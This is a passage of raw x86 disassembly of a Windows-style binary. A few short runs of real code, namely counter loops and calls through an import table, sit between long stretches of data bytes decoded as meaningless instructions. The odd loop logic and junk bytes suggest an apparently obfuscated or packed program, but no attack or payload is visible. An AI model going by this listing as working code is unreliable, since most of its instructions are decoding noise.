  41997b:	or     eax,0x46e2b413
  419980:	outs   dx,DWORD PTR ds:[esi]
  419981:	mov    bh,BYTE PTR [edi+0x17]
  419984:	sub    edi,DWORD PTR [ebx+0x77]
  419987:	lock cld 
  419989:	mov    dl,0xdb
  41998b:	pop    ss
  41998c:	pop    esi
  41998d:	or     dh,bh
  41998f:	adc    eax,0xff7b732c
  419994:	push   ebp
  419995:	shl    BYTE PTR [esi+0x23],cl
  419998:	shl    BYTE PTR [ebp+edi*1-0x34],0xa5
  41999d:	xor    al,0xcc
  41999f:	push   ds
  4199a0:	sub    BYTE PTR [ebx],bl
  4199a2:	ret    
  4199a3:	adc    dl,ch
  4199a5:	fs mov eax,0x5c401a96
  4199ab:	xchg   esi,eax
  4199ac:	jge    0x41993d
  4199ae:	push   ebx
  4199af:	mov    ecx,0x37e0597d
  4199b4:	fadd   st(2),st
  4199b6:	sub    BYTE PTR [eax-0x6d],bh
  4199b9:	sub    al,0x4
  4199bb:	mov    eax,ds:0x2b8da8e4
  4199c0:	xlat   BYTE PTR ds:[ebx]
  4199c1:	adc    ecx,0x1fe4
  4199c7:	xor    esi,esi
  4199c9:	xor    DWORD PTR ds:0x42a82d,0x2675
  4199d3:	mov    DWORD PTR [ebp-0x28],esi
  4199d6:	mov    DWORD PTR ds:0x42a8a1,0x12
  4199e0:	cmp    DWORD PTR ds:0x42a8a1,0x0
  4199e7:	je     0x419a88
  4199ed:	cmp    DWORD PTR ds:0x42a8a1,0x16
  4199f4:	jne    0x419a15
  4199fa:	push   0x8ec2
  4199ff:	push   DWORD PTR [ebp-0x24]
  419a02:	push   0x4fb2
  419a07:	push   0x17f0
  419a0c:	push   DWORD PTR [ebp-0x20]
  419a0f:	call   DWORD PTR ds:0x41d11c
  419a15:	mov    ecx,DWORD PTR ds:0x42a8a1
  419a1b:	dec    ecx
  419a1c:	mov    DWORD PTR ds:0x42a8a1,ecx
  419a22:	jmp    0x4199e0
  419a27:	mov    DWORD PTR ds:0x42a785,0x1b
  419a31:	cmp    DWORD PTR ds:0x42a785,0x0
  419a38:	je     0x419a88
  419a3e:	cmp    DWORD PTR ds:0x42a785,0x5
  419a45:	jne    0x419a54
  419a4b:	push   DWORD PTR [ebp-0x14]
  419a4e:	call   DWORD PTR ds:0x41d1fc
  419a54:	cmp    DWORD PTR ds:0x42a785,0x6
  419a5b:	jne    0x419a6e
  419a61:	mov    ecx,DWORD PTR ds:0x42a785
  419a67:	dec    ecx
  419a68:	mov    DWORD PTR ds:0x42a785,ecx
  419a6e:	xor    ecx,ecx
  419a70:	or     ecx,DWORD PTR ds:0x42a785
  419a76:	dec    ecx
  419a77:	mov    DWORD PTR ds:0x42a785,ecx
  419a7d:	jmp    0x419a31
  419a82:	adc    DWORD PTR ds:0x42a825,ebx
  419a88:	mov    DWORD PTR [ebp-0x2c],esi
  419a8b:	and    DWORD PTR ds:0x42a869,ecx
  419a91:	mov    DWORD PTR [ebp-0x14],esi
  419a94:	add    ecx,DWORD PTR ds:0x42a7d5
  419a9a:	mov    DWORD PTR [ebp-0x8],esi
  419a9d:	mov    ecx,DWORD PTR [ebp-0x18]
  419aa0:	adc    DWORD PTR ds:0x42a85d,0x42a7d1
  419aaa:	xor    ecx,eax
  419aac:	xor    edi,edi
  419aae:	and    DWORD PTR ds:0x42a8a1,0x0
  419ab8:	jmp    0x419ac8
  419abd:	mov    eax,ds:0x42a8a1
  419ac2:	inc    eax
  419ac3:	mov    ds:0x42a8a1,eax
  419ac8:	cmp    DWORD PTR ds:0x42a8a1,0x1c
  419acf:	jae    0x419af8
  419ad5:	cmp    DWORD PTR ds:0x42a8a1,0x1e
  419adc:	jne    0x419aed
  419ae2:	push   0x42a825
  419ae7:	call   DWORD PTR ds:0x41d120
  419aed:	jmp    0x419abd
  419af2:	adc    eax,DWORD PTR ds:0x42a7ed
  419af8:	add    ecx,ebx
  419afa:	mov    DWORD PTR [ebp-0x20],ecx
  419afd:	mov    eax,ds:0x42a865
  419b02:	jmp    0x419d37
  419b07:	cmp    eax,0xcbcec3c5
  419b0c:	fcmovbe st,st(1)
  419b0e:	aad    0x68
  419b10:	xor    DWORD PTR [ecx+0xd],0x5c
  419b14:	icebp  
  419b15:	mov    ds:0x7fcfd036,al
  419b1a:	js     0x419b2c
  419b1c:	jle    0x419b96
  419b1e:	js     0x419b49
  419b20:	inc    esp
  419b21:	or     BYTE PTR [eax-0x32],ch
  419b24:	les    esp,FWORD PTR [ebp+0x2f732a02]
  419b2a:	add    BYTE PTR [ebx],dh
  419b2c:	push   esp
  419b2d:	mov    esp,?
  419b2f:	jmp    0xe52cd5f2
  419b34:	xor    al,0xd
  419b36:	and    DWORD PTR [ebx+0x34e55995],edx
  419b3c:	xlat   BYTE PTR ds:[ebx]
  419b3d:	cs and eax,0xbdd66e93
  419b43:	fs inc ebx
  419b45:	stos   BYTE PTR es:[edi],al
  419b46:	ds jmp 0x419b07
  419b49:	dec    edx
  419b4a:	sbb    BYTE PTR [edi-0x3b],dh
  419b4d:	push   eax
  419b4e:	cwde   
  419b4f:	repnz mov cl,0xf0
  419b52:	ds sti 
  419b54:	inc    eax
  419b55:	and    DWORD PTR [edx+0x63],esi
  419b58:	fld    TBYTE PTR ds:0x3151eeb8
  419b5e:	sbb    BYTE PTR [ecx+edi*1+0x31],dl
  419b62:	rcl    BYTE PTR [edi-0x75],cl
  419b65:	enter  0x9b7d,0x95
  419b69:	ja     0x419bb5
  419b6b:	popw   es
  419b6d:	adc    bl,BYTE PTR [ecx-0x19755b38]
  419b73:	ins    BYTE PTR es:[edi],dx
  419b74:	push   edx
  419b75:	ja     0x419b75
  419b77:	loopne 0x419b34
  419b79:	pop    ebp
  419b7a:	jo     0x419bdc
  419b7c:	gs pusha 
  419b7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b7f:	icebp  
  419b80:	lods   eax,DWORD PTR ds:[esi]
  419b81:	cld    
  419b82:	cwde   
  419b83:	add    esi,ecx
  419b85:	popa   
  419b86:	mov    ebx,0xb5db2ead
  419b8b:	sahf   
  419b8c:	pop    esp
  419b8d:	add    eax,0x7bb15aaf
  419b92:	jo     0x419bc0
  419b94:	ret    
  419b95:	lods   eax,DWORD PTR ds:[esi]
  419b96:	mov    eax,ds:0x99505633
  419b9b:	pop    esi
  419b9c:	fmul   QWORD PTR [edi]
  419b9e:	fsub   DWORD PTR [ebp+esi*8+0x71b7380b]
  419ba5:	add    al,0x2d
  419ba7:	inc    ebx
  419ba8:	mov    ah,0x69
  419baa:	push   ebp
  419bab:	inc    esi
  419bac:	dec    ebx
  419bad:	fwait
  419bae:	mov    ebx,0x33f30c4
  419bb3:	adc    eax,0xa6854f94
  419bb8:	cmc    
  419bb9:	not    BYTE PTR [ebp-0x15]
  419bbc:	dec    ebp
  419bbd:	cmp    edi,DWORD PTR ds:0xf5de7c54
  419bc3:	jo     0x419b96
  419bc5:	jmpw   0x4c09
  419bc9:	cwde   
  419bca:	das    
  419bcb:	cmp    ebp,DWORD PTR [ebx+eiz*1+0x9]
  419bcf:	cmp    al,0x34
  419bd1:	aad    0x60
  419bd3:	mov    ds:0x8ffe20cb,eax
  419bd8:	imul   ebp,edi,0xffffffbe
  419bdb:	lds    eax,FWORD PTR [edx]
  419bdd:	call   0x30:0xeda7e567
  419be4:	retf   0x384f
  419be7:	pop    es
  419be8:	push   edi
  419be9:	or     eax,0x32109f04
  419bee:	lock push esp
  419bf0:	xchg   ebx,eax
  419bf1:	test   eax,0x50a9e0e5
  419bf6:	frstor [edx]
  419bf8:	mov    BYTE PTR [ecx+0x57f4a907],dl
  419bfe:	(bad)
  419c01:	pop    esp
  419c02:	mov    dh,0x60
  419c04:	push   ebx
  419c05:	jg     0x419ba2
  419c07:	aam    0xcd
  419c09:	shl    al,0xcf
  419c0c:	or     BYTE PTR [ebp-0x26],dh
  419c0f:	jmp    0x14c2:0x2b97ee18
  419c16:	lods   al,BYTE PTR ds:[esi]
  419c17:	jmp    0xdb17:0x78ecdc98
  419c1e:	cs icebp 
  419c20:	sbb    al,0xe8
  419c22:	aam    0x15
  419c24:	test   eax,0xcbe778c0
  419c29:	xor    DWORD PTR [edi],0x66
  419c2c:	sbb    BYTE PTR [ecx],0xdd
  419c2f:	(bad)  
  419c30:	jmp    0x85d398b7
  419c35:	jecxz  0x419c2e
  419c37:	fwait
  419c38:	mul    DWORD PTR [ebx+ebx*4-0x79]
  419c3c:	in     eax,dx
  419c3d:	mov    ecx,0x6d7eef1a
  419c42:	adc    eax,DWORD PTR [ebp+0x4]
  419c45:	retf   0x51e5
  419c48:	inc    edx
  419c49:	pop    ds
  419c4a:	jmp    0x566cc5bd
  419c4f:	bound  ebp,QWORD PTR [edx+0x2]
  419c52:	dec    esi
  419c53:	test   al,0x7c
  419c55:	xor    ecx,DWORD PTR [ebx+0x3e]
  419c58:	xchg   edi,eax
  419c59:	jo     0x419c97
  419c5b:	push   ecx
  419c5c:	iret   
  419c5d:	nop
  419c5e:	jnp    0x419cc6
  419c60:	mov    esi,0x35153a11
  419c65:	jmp    0x9648:0x55dd1509
  419c6c:	sub    eax,eax
  419c6e:	leave  
  419c6f:	push   0xf1463fd5
  419c74:	dec    ecx
  419c75:	push   ecx
  419c76:	jae    0x419c51
  419c78:	and    eax,0xb0aad5ef
  419c7d:	xchg   ebx,eax
  419c7e:	push   0xd1d568e7
  419c83:	arpl   WORD PTR [edi+0x65c402ef],cx
  419c89:	in     al,0x56
  419c8b:	inc    edi
  419c8c:	jg     0x419cd8
  419c8e:	dec    edi
  419c8f:	push   cs
  419c90:	gs or  eax,0x74e2d433
  419c96:	mov    ebx,0x70033699
  419c9b:	aad    0xa5
  419c9d:	adc    BYTE PTR [edi],dh
  419c9f:	mov    dl,BYTE PTR ds:0x6707a77
  419ca5:	mov    bl,BYTE PTR [eax-0x26dba71a]
  419cab:	mov    dl,0x39
  419cad:	jmp    0xf27f4d71
  419cb2:	xchg   esi,eax
  419cb3:	push   esp
  419cb4:	jno    0x419ccc
  419cb6:	sar    BYTE PTR [ebx],cl
  419cb8:	xor    al,0x9e
  419cba:	mov    dl,0x34
  419cbc:	mov    BYTE PTR [edx-0x1c68788c],bh
  419cc2:	lods   eax,DWORD PTR ds:[esi]
  419cc3:	pop    esi
  419cc4:	fist   WORD PTR [edx+0x1f5ea977]
  419cca:	ret    0x4edf
  419ccd:	xor    ebp,DWORD PTR [eax+0x5cd08a5b]
  419cd3:	fistp  QWORD PTR [edi+0x125a12d2]
  419cd9:	adc    BYTE PTR [ecx+0x56],dl
  419cdc:	xchg   edi,eax
  419cdd:	sub    al,0x25
  419cdf:	mov    ah,BYTE PTR [ebp+0x39d2d13e]
  419ce5:	sbb    edx,edi
  419ce7:	ins    BYTE PTR es:[edi],dx
  419ce8:	dec    esi
  419ce9:	sar    DWORD PTR [eax-0x5],1
  419cec:	inc    esi
  419ced:	mov    ebp,gs
  419cef:	sub    dl,al
  419cf1:	iret   
  419cf2:	add    DWORD PTR [esi-0x2d],0x7634edcd
  419cf9:	inc    edx
  419cfa:	and    al,0x86
  419cfc:	adc    BYTE PTR [edi-0x5df6655f],0x45
  419d03:	mov    BYTE PTR ds:0xd1aa8e49,al
  419d09:	loopne 0x419d13
  419d0b:	jl     0x419d54
  419d0d:	jb     0x419d45
  419d0f:	pop    esp
  419d10:	in     eax,dx
  419d11:	jl     0x419cdd
  419d13:	fmul   DWORD PTR [ebx+0x47581ac5]
  419d19:	lods   eax,DWORD PTR ds:[esi]
  419d1a:	jmp    0xe767:0x700cd13c
  419d21:	push   ss
  419d22:	call   0xc260:0x69699227
  419d29:	aad    0x5a
  419d2b:	std    
  419d2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d2d:	test   DWORD PTR [eax-0x1f],esp
  419d30:	ss cld 
  419d32:	jmp    0x89bea70f
  419d37:	mov    eax,DWORD PTR [ebp-0x20]
  419d3a:	je     0x41a8c9
  419d40:	inc    eax
  419d41:	mov    eax,DWORD PTR [ebp-0x4]
  419d44:	xor    eax,0x7510850
  419d49:	sbb    DWORD PTR ds:0x42a859,0x42a78d
  419d53:	add    eax,ebx
  419d55:	mov    DWORD PTR ds:0x42a8a9,0x7077
  419d5f:	cmp    edi,eax
  419d61:	mov    DWORD PTR ds:0x42a85d,0xab2
  419d6b:	jmp    0x419fa0
  419d70:	(bad)  
  419d71:	into   
  419d72:	ror    bh,cl
  419d74:	(bad)  
  419d76:	leave  
  419d77:	(bad)  
  419d78:	push   0xffffffe9
  419d7a:	or     esi,esi
  419d7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d7d:	int    0xc7
  419d7f:	sbb    ch,al
  419d81:	int    0x7f
  419d83:	js     0x419d95
  419d85:	jle    0x419dff
  419d87:	js     0x419d2c
  419d89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d8a:	jecxz  0x419d80
  419d8c:	sbb    DWORD PTR [ecx+0x2a],esp
  419d8f:	inc    esi
  419d90:	iret   
  419d91:	or     DWORD PTR [ebp+0x39703a55],eax
  419d97:	pop    edx
  419d98:	stos   BYTE PTR es:[edi],al
  419d99:	lds    esi,FWORD PTR [ebx]
  419d9b:	repnz mov DWORD PTR [ecx],ebp
  419d9e:	jae    0x419d6c
  419da0:	dec    esi
  419da1:	adc    esp,DWORD PTR [ecx]
  419da3:	imul   edi,DWORD PTR [ecx+ebx*8-0x5b00b79],0xffffffdb
  419dab:	sbb    BYTE PTR [edx-0x37dd7b06],cl
  419db1:	into   
  419db2:	add    DWORD PTR [edi-0x1137645c],esi
  419db8:	sti    
  419db9:	dec    ebx
  419dba:	jb     0x419d5f
  419dbc:	jp     0x419e2f
  419dbe:	shr    DWORD PTR [esi-0x36],0xf1
  419dc2:	xchg   esi,eax
  419dc3:	sub    BYTE PTR [esi+0x41],cl
  419dc6:	xor    eax,0xdcf25d75
  419dcb:	and    DWORD PTR [edx],ebx
  419dcd:	jns    0x419d7f
  419dcf:	push   cs
  419dd0:	jbe    0x419e30
  419dd2:	push   ss
  419dd3:	add    bh,BYTE PTR [eax]
  419dd5:	mov    ebp,0x48696f23
  419dda:	out    0x70,eax
  419ddc:	fwait
  419ddd:	and    BYTE PTR [ebx-0x7],al
  419de0:	lea    edi,[ebp+0x6b]
  419de3:	xor    DWORD PTR [edx-0x5e],ecx
  419de6:	rcl    al,1
  419de8:	in     eax,dx
  419de9:	sbb    esp,esp
  419deb:	xchg   ebp,eax
  419dec:	(bad)  
  419ded:	dec    ecx
  419dee:	out    0xf2,al
  419df0:	push   esp
  419df1:	dec    ebx
  419df2:	int3   
  419df3:	cmp    ebx,ecx
  419df5:	adc    ebx,DWORD PTR ds:0x8c1d646b
  419dfb:	adc    al,0xf4
  419dfd:	(bad)
  419e00:	mov    esi,es
  419e02:	dec    ebp
  419e03:	inc    edi
  419e04:	push   ebx
  419e05:	push   ss
  419e06:	xor    ebx,DWORD PTR [eax]
  419e08:	sub    al,0x4e
  419e0a:	scas   al,BYTE PTR es:[edi]
  419e0b:	xor    BYTE PTR [ebx],0xb6
  419e0e:	push   ebp
  419e0f:	ror    BYTE PTR [esi+ebp*8+0x14e54059],1
  419e16:	sti    
  419e17:	mov    esi,0x4e7c202b
  419e1c:	jbe    0x419e3e
  419e1e:	into   
  419e1f:	jmp    FWORD PTR [ecx+0x22]
  419e22:	jae    0x419da9
  419e24:	shl    BYTE PTR [eax],cl
  419e26:	jnp    0x419e17
  419e28:	sbb    al,BYTE PTR [ecx-0x486dfaec]
  419e2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e2f:	fsub   st(7),st
  419e31:	push   ds
  419e32:	icebp  
  419e33:	dec    edi
  419e34:	imul   ebx,DWORD PTR cs:[edi-0x1],0xf906c9ea
  419e3c:	rol    DWORD PTR [esi-0x322fb02d],0xd9
  419e43:	inc    esi
  419e44:	aam    0xb5
  419e46:	sbb    al,0x93
  419e48:	and    ebp,eax
  419e4a:	dec    edx
  419e4b:	bnd js 0x419e33
  419e4e:	pop    esi
  419e4f:	adc    al,0x3b
  419e51:	outs   dx,BYTE PTR ds:[esi]
  419e52:	sbb    esi,edi
  419e54:	inc    ecx
  419e55:	mov    DWORD PTR [eax+ebx*4-0x60],ebx
  419e59:	push   esp
  419e5a:	add    bh,bh
  419e5c:	mov    ds:0xcdc83eb7,al
  419e61:	add    edi,edx
  419e63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e64:	out    0x6,al
  419e66:	dec    eax
  419e67:	mov    BYTE PTR [edi-0x61],ah
  419e6a:	cmp    al,0xc8
  419e6c:	test   DWORD PTR [ebx+0x58],esp
  419e6f:	jb     0x419e1a
  419e71:	jecxz  0x419eb6
  419e73:	cmp    edx,DWORD PTR [edx+0x56]
  419e76:	push   ss
  419e77:	ds cs xchg esp,eax
  419e7a:	retf   
  419e7b:	cmp    BYTE PTR [eax-0x6a],ch
  419e7e:	xor    al,BYTE PTR [eax+0x17]
  419e81:	adc    bl,bh
  419e83:	add    BYTE PTR [ebp-0x69cfb851],dl
  419e89:	repnz pop ebx
  419e8b:	test   al,0xe9
  419e8d:	retf   
  419e8e:	adc    al,0x24
  419e90:	bound  ecx,QWORD PTR [edi]
  419e92:	push   edx
  419e93:	pusha  
  419e94:	mov    esp,0xcc4dddc1
  419e99:	aas    
  419e9a:	push   0x20
  419e9c:	(bad)  
  419e9d:	in     al,dx
  419e9e:	dec    ebx
  419e9f:	xlat   BYTE PTR ds:[ebx]
  419ea0:	cmc    
  419ea1:	sar    DWORD PTR [edx-0x555cafee],cl
  419ea7:	pop    es
  419ea8:	pop    eax
  419ea9:	adc    edx,DWORD PTR [ecx-0x4d]
  419eac:	xor    al,0xd8
  419eae:	cmp    DWORD PTR [esi-0x53],ecx
  419eb1:	cmp    al,0x62
  419eb3:	sub    edx,DWORD PTR ds:0xee634284
  419eb9:	sbb    ebp,esp
  419ebb:	add    eax,0x736af9d9
  419ec0:	lahf   
  419ec1:	cmp    DWORD PTR [ecx-0x768cd402],esi
  419ec7:	pusha  
  419ec8:	test   BYTE PTR [ebx-0x64],dh
  419ecb:	enter  0x1267,0xe9
  419ecf:	bound  ecx,QWORD PTR [ebx+0x78]
  419ed2:	sub    edi,esi
  419ed4:	pop    ds
  419ed5:	daa    
  419ed6:	adc    eax,0x70b57dfc
  419edb:	lods   al,BYTE PTR ds:[esi]
  419edc:	xchg   esi,eax
  419edd:	sbb    eax,0xf00ccc6f
  419ee2:	push   0xffffffb8
  419ee4:	adc    eax,0xc4df5146
  419ee9:	imul   ecx,DWORD PTR [esi-0x5b],0xa
  419eed:	inc    esp
  419eee:	inc    edx
  419eef:	loope  0x419eff
  419ef1:	(bad)
  419ef4:	pop    edi
  419ef5:	xlat   BYTE PTR ds:[ebx]
  419ef6:	mov    dh,0xb
  419ef8:	adc    esp,DWORD PTR [esi+0x66]
  419efb:	jmp    0xb2ca:0x427939d3
  419f02:	cmp    ebx,DWORD PTR [edi]
  419f04:	and    al,BYTE PTR [edi]
  419f06:	cli    
  419f07:	adc    eax,0x9a2a23d5
  419f0c:	scas   al,BYTE PTR es:[edi]
  419f0d:	cmp    ebx,DWORD PTR [edi]
  419f0f:	retf   0xfd1a
  419f12:	dec    ecx
  419f13:	ror    edx,cl
  419f15:	or     al,0x68
  419f17:	xchg   edi,ebx
  419f19:	mov    eax,0xf49a7ff4
  419f1e:	mov    dh,0x95
  419f20:	test   BYTE PTR [edx-0xc3b96e],dl
  419f26:	and    eax,0xf0ba3e60
  419f2b:	jb     0x419ebf
  419f2d:	cwde   
  419f2e:	mov    dl,BYTE PTR [esp+ecx*2]
  419f31:	push   ds
  419f32:	inc    esi
  419f33:	repz cld 
  419f35:	fwait
  419f36:	pop    edx
  419f37:	lods   eax,DWORD PTR ds:[esi]
  419f38:	cdq    
  419f39:	pop    edx
  419f3a:	test   eax,0x5fd094f4
  419f3f:	fistp  DWORD PTR [edx-0x4b]
  419f42:	dec    eax
  419f43:	sbb    esp,0xbbc78fe2
  419f49:	repz ss dec esp
  419f4c:	add    BYTE PTR [eax+0x5cd7207b],ch
  419f52:	clc    
  419f53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f54:	test   eax,0x165bdb10
  419f59:	jmp    0xdf6d36db
  419f5e:	pop    es
  419f5f:	xor    BYTE PTR ds:0x22728108,dl
  419f65:	leave  
  419f66:	(bad)  
  419f67:	in     eax,dx
  419f68:	or     eax,DWORD PTR [eax-0x75]
  419f6b:	(bad)  
  419f6c:	mov    eax,ds:0xc69faf7d
  419f71:	inc    edi
  419f72:	ja     0x419fa0
  419f74:	pop    esp
  419f75:	test   BYTE PTR [eax-0x40],dh
  419f78:	fwait
  419f79:	nop
  419f7a:	xchg   esp,eax
  419f7b:	aas    
  419f7c:	mov    al,0xb1
  419f7e:	bndstx [ebx+0x25],bnd3
  419f82:	into   
  419f83:	mov    DWORD PTR [ecx],eax
  419f85:	add    al,0x2b
  419f87:	je     0x419fd0
  419f89:	push   eax
  419f8a:	fild   WORD PTR [edi]
  419f8c:	sbb    DWORD PTR [esi+eiz*8+0x1dd77692],0xaffc882d
  419f97:	popf   
  419f98:	int    0xf2
  419f9a:	jmp    0xe9ccbcee
  419f9f:	pop    eax
  419fa0:	jne    0x41a637
  419fa6:	add    DWORD PTR ds:0x42a7e5,0x42a781
  419fb0:	push   DWORD PTR [ebp+0x8]
  419fb3:	or     DWORD PTR ds:0x42a891,0x48c2
  419fbd:	call   0x4175e1
  419fc2:	and    DWORD PTR ds:0x42a855,edi
  419fc8:	mov    DWORD PTR [ebp-0x20],eax
  419fcb:	jmp    0x41a200
  419fd0:	aas    
  419fd1:	into   
  419fd2:	leave  
  419fd3:	int    0xd9
  419fd5:	(bad)  
  419fd7:	into   
  419fd8:	fwait
  419fd9:	or     BYTE PTR [eax-0x74],0x42
  419fdd:	out    dx,eax
  419fde:	mov    edx,0x7fd380ae
  419fe3:	js     0x419ff5
  419fe5:	jle    0x41a05f
  419fe7:	js     0x419fb4
  419fe9:	xchg   esp,eax
  419fea:	add    eax,0x9a9f2f9f
  419fef:	inc    ecx
  419ff0:	xchg   ecx,eax
  419ff1:	mov    ds:0x69e8406,eax
  419ff6:	mov    eax,ds:0x4db67a0
  419ffb:	mov    WORD PTR [ebx],gs
  419ffd:	int    0xd7
  419fff:	inc    esp
  41a000:	push   eax
  41a001:	icebp  
  41a002:	lock addr16 inc edx
  41a005:	iret   
  41a006:	gs push edi
  41a008:	inc    esi
  41a009:	inc    ebx
  41a00a:	fild   DWORD PTR ds:0x42ef12e8
  41a010:	xor    BYTE PTR [edi+0xdcc31b7],0x20
  41a017:	adc    al,0x4a
  41a019:	lahf   
  41a01a:	addr16 add ebx,0xa8c23560
  41a021:	adc    esi,DWORD PTR [esi+0x7a]
  41a024:	cmp    DWORD PTR [ecx],eax
  41a026:	dec    edi
  41a027:	js     0x41a012
  41a029:	push   eax
  41a02a:	(bad)  
  41a02b:	jae    0x41a097
  41a02d:	stos   DWORD PTR es:[edi],eax
  41a02e:	ret    0x5f4a
  41a031:	push   ebx
  41a032:	add    al,0x15
  41a034:	hlt    
  41a035:	enter  0x1618,0x9b
  41a039:	in     eax,0x87
  41a03b:	imul   esi,DWORD PTR [ecx],0xdefaa02f
  41a041:	ja     0x41a08a
  41a043:	aam    0x37
  41a045:	leave  
  41a046:	iret   
  41a047:	jecxz  0x419fde
  41a049:	imul   edi,edi,0xffffffd8
  41a04c:	addr16 push ecx
  41a04e:	adc    BYTE PTR [ecx-0x76],0x59
  41a052:	sti    
  41a053:	sbb    bh,BYTE PTR [eax]
  41a055:	mov    es,WORD PTR [edi*8-0x4156ad2f]
  41a05c:	pop    ecx
  41a05d:	push   ss
  41a05e:	(bad)  
  41a05f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a060:	test   DWORD PTR [ebx],ecx
  41a062:	iret   
  41a063:	out    dx,eax
  41a064:	loopne 0x41a03a
  41a066:	loope  0x419ff0
  41a068:	rcl    DWORD PTR [edx],cl
  41a06a:	push   cs
  41a06b:	retf   0x2a7c
  41a06e:	dec    ecx
  41a06f:	mov    bl,BYTE PTR [esi-0x32136182]
  41a075:	movaps xmm4,xmm5
  41a078:	xchg   esp,eax
  41a079:	imul   DWORD PTR [edx]
  41a07b:	pop    ecx
  41a07c:	loopne 0x41a0a5
  41a07e:	in     al,0xb1
  41a080:	test   esp,ecx
  41a082:	sbb    al,0xb1
  41a084:	es jbe 0x41a0b4
  41a087:	push   ebx
  41a088:	std    
  41a089:	dec    ecx
  41a08a:	push   ecx
  41a08b:	and    ecx,ecx
  41a08d:	stos   BYTE PTR es:[edi],al
  41a08e:	and    bh,BYTE PTR [ebx+0x6f2a7b6f]
  41a094:	mov    bh,0xb4
  41a096:	mov    ah,al
  41a098:	push   edx
  41a099:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41a09b:	(bad)  
  41a09c:	pop    ss
  41a09d:	aaa    
  41a09e:	sbb    BYTE PTR [edx],bl
  41a0a0:	(bad)  
  41a0a1:	xlat   BYTE PTR ds:[ebx]
  41a0a2:	pop    esi
  41a0a3:	cmp    eax,0x7df054f0
  41a0a8:	mov    edx,0xc969d79
  41a0ad:	addr16 pop es
  41a0af:	pop    esi
  41a0b0:	iret   
  41a0b1:	mov    bl,0x9
  41a0b3:	dec    esp
  41a0b4:	xchg   ecx,eax
  41a0b5:	fprem1 
  41a0b7:	jmp    0xf372:0x2e841535
  41a0be:	lds    ecx,FWORD PTR [ebx-0xcabe1c4]
  41a0c4:	cmovo  ecx,DWORD PTR [ecx]
  41a0c7:	push   ebp
  41a0c8:	loop   0x41a0a1
  41a0ca:	aam    0xc1
  41a0cc:	fiadd  DWORD PTR [edi-0x50]
  41a0cf:	adc    bp,sp
  41a0d2:	int    0x63
  41a0d4:	retf   0xe494
  41a0d7:	fwait
  41a0d8:	dec    esi
  41a0d9:	xchg   esi,eax
  41a0da:	jle    0x41a0ab
  41a0dc:	xchg   ecx,eax
  41a0dd:	pop    es
  41a0de:	ror    BYTE PTR [ebx+0x4406ec9a],0x83
  41a0e5:	dec    ecx
  41a0e6:	jg     0x41a0f5
  41a0e8:	repz call 0xaeb7:0x335db00c
  41a0f0:	loopne 0x41a11e
  41a0f2:	and    cl,BYTE PTR [edx+ecx*1+0x3d]
  41a0f6:	out    dx,eax
  41a0f7:	data16 aas 
  41a0f9:	xchg   esi,eax
  41a0fa:	push   eax
  41a0fb:	jne    0x41a170
  41a0fd:	sub    DWORD PTR [esi],eax
  41a0ff:	add    DWORD PTR [ecx-0x37d8ee6f],ebx
  41a105:	and    BYTE PTR [ebp-0x18],dh
  41a108:	inc    ecx
  41a109:	clc    
  41a10a:	lea    eax,[edi]
  41a10c:	pop    es
  41a10d:	add    ebx,edx
  41a10f:	addr16 xchg edx,eax
  41a111:	mov    edi,0x2667a4cb
  41a116:	or     al,0x55
  41a118:	push   eax
  41a119:	sub    BYTE PTR [esi+0x4adeb25f],0xe6
  41a120:	cdq    
  41a121:	(bad)  
  41a122:	hlt    
  41a123:	mov    ah,cl
  41a125:	xchg   edx,eax
  41a126:	js     0x41a127
  41a128:	pop    esi
  41a129:	dec    edi
  41a12a:	iret   
  41a12b:	shl    DWORD PTR [ebx+0x2],cl
  41a12e:	jo     0x41a130
  41a130:	neg    DWORD PTR [edx]
  41a132:	push   edi
  41a133:	dec    edx
  41a134:	data16 mov dh,0x35
  41a137:	and    BYTE PTR [esi+0x26],al
  41a13a:	adc    al,0x48
  41a13c:	or     DWORD PTR [edi+0x327c28da],edi
  41a142:	sbb    DWORD PTR [ecx+ebp*2-0x1e],ecx
  41a146:	leave  
  41a147:	arpl   WORD PTR [edi],bx
  41a149:	xor    ebp,edi
  41a14b:	mov    BYTE PTR [esp+eax*4+0x7026098e],ch
  41a152:	loop   0x41a0ee
  41a154:	lds    esi,FWORD PTR [eax+0x7d]
  41a157:	mov    ebx,DWORD PTR cs:[ebx]
  41a15a:	ss faddp st(0),st
  41a15d:	clc    
  41a15e:	fwait
  41a15f:	dec    esp
  41a160:	jmp    0x41a1a0
  41a162:	or     esp,DWORD PTR [edi+ebp*8+0x291be791]
  41a169:	imul   esi,DWORD PTR [esi],0xa2f1ad4a
  41a16f:	inc    eax
  41a170:	cmp    al,0xac
  41a172:	xor    DWORD PTR [eax-0x4f],esp
  41a175:	xchg   ebx,eax
  41a176:	or     BYTE PTR [ebx],0xcb
  41a179:	cmp    bl,al
  41a17b:	mov    edi,0x1f2147a4
  41a180:	iret   
  41a181:	js     0x41a12b
  41a183:	in     al,dx
  41a184:	(bad)  
  41a185:	ret    
  41a186:	scas   eax,DWORD PTR es:[edi]
  41a187:	fisttp DWORD PTR ds:0x21919e6c
  41a18d:	test   DWORD PTR [ebx+ecx*4],ebp
  41a190:	out    0xd8,al
  41a192:	loop   0x41a210
  41a194:	retf   
  41a195:	std    
  41a196:	clc    
  41a197:	adc    eax,ebx
  41a199:	pop    ebx
  41a19a:	leave  
  41a19b:	arpl   WORD PTR [ebx],si
  41a19d:	and    eax,0xe3b6d2e0
  41a1a2:	adc    DWORD PTR [eax+0x49],esi
  41a1a5:	sbb    ch,ah
  41a1a7:	repz inc esp
  41a1a9:	add    dh,ch
  41a1ab:	imul   ebp,ebx,0xfffffff4
  41a1ae:	jle    0x41a195
  41a1b0:	add    al,0xd
  41a1b2:	shl    bh,1
  41a1b4:	mov    ds:0xab54fa00,al
  41a1b9:	mov    edx,0xe089171c
  41a1be:	dec    ebx
  41a1bf:	ds push eax
  41a1c1:	mov    esi,0x1783d8a6
  41a1c6:	repnz pop esp
  41a1c8:	mov    eax,0xee070679
  41a1cd:	jns    0x41a159
